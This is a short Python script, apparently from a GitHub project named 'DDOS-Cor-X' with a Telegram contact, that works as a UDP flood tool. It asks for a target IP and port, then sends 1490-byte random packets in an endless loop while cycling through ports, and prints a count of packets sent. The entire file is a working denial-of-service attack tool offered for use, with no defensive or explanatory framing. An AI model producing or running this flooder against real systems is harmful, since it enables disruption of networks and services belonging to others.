import sys
import os
import time as t
import socket
import random as r

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = r._urandom(1490)

print()
print("github   : https://github.com/AndkCqX/DDOS-Cor-X-AndkCqX")
print("Telegram : @AndkCq")
print()
ip = input("IP : ")
port = int(input("端口 : "))
os.system("clear")
os.system("AndkCqX | Cor X")
print("Starting......")
t.sleep(2)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1

